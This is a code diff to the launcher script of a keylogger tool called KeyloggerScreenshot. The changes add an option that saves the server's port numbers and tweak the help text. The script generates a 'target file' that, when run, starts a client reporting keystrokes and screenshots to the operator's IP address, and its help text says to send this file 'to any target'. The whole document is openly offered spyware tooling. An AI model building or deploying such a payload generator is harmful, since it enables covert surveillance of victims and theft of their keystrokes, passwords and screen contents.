@@ -9,8 +9,10 @@ gui = """
   / ,<  / _ \ / / / // // __ \ / __ `// __ `// _ \ / ___/\__ \ / ___// ___// _ \ / _ \ / __ \ / ___// __ \ / __ \ / __/
  / /| |/  __// /_/ // // /_/ // /_/ // /_/ //  __// /   ___/ // /__ / /   /  __//  __// / / /(__  )/ / / // /_/ // /_  
 /_/ |_|\___/ \__, //_/ \____/ \__, / \__, / \___//_/   /____/ \___//_/    \___/ \___//_/ /_//____//_/ /_/ \____/ \__/  
-            /____/           /____/ /____/                                                                             
-                        ~Created by: Fawaz Bashiru~                             
+            /____/           /____/ /____/    
+                                                                                     
+                        ~Created by: Fawaz Bashiru~             
+                        ~Write "python KLS_start.py -help" for help                            
 """
 print(gui)
 lst = sys.argv
@@ -33,6 +35,17 @@ try:
             port_listener = int(port_numbers[2])
             port_time = int(port_numbers[3])
 
+            if "-p" in lst:
+                idx_port = lst.index("-p")
+                try:
+                    print('ALL THE NUMBERS HAVE BEEN SAVED TO "ports.py"')
+                    print(f"\nport_photos = {port_photos}\nport_keylogger = {port_keylogger}\nport_listener = {port_listener}\nport_time = {port_time}\n")
+                    with open("ports.py", "a+") as file:
+                        file.write(f"port_photos = {port_photos}\nport_keylogger = {port_keylogger}\nport_listener = {port_listener}\nport_time = {port_time}")
+
+                except IndexError:
+                    quit()
+
             if "-s" in lst:
                 idx_s = lst.index("-s")
                 try:
@@ -53,11 +66,11 @@ try:
                 idx_cf = lst.index("-cf")
                 try:
                     filename = lst[idx_cf + 1]
-                    if not filename.endswith(".py"):
+                    if not filename.endswith("py"):
                         data = filename.split(".")
                         filename = f"{data[0]}.py"
                     if "-" in filename:
-                        filename = f"target.py"
+                        filename = "target.py"
 
                     with open(f"{filename}", "a+") as file:
                         file.write(f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener},ip, {port_time}, duration_in_seconds={seconds}) \nkey_client.start()")
@@ -94,7 +107,7 @@ try:
         print("PLEASE INSERT YOUR IP WITH -aip")
 
     if "-help" in lst:
-        print("-aip INSERT THE SERVERS IP\n-s SPECIFY YOUR SECONDS (DEFAULT 60 SECONDS)\n-cf CREATES TARGET FILE WHICH YOU SEND TO ANY TARGET")
+        print("-aip INSERT THE SERVERS IP\n-s   SPECIFY YOUR SECONDS (DEFAULT 60 SECONDS)\n-cf  CREATES TARGET FILE WHICH YOU SEND TO ANY TARGET\n-p   SAVES ALL THE PORTS OF THE CURRENT SERVER")
 
 except OSError:
     print("CHECK YOUR IP-ADDRESS")
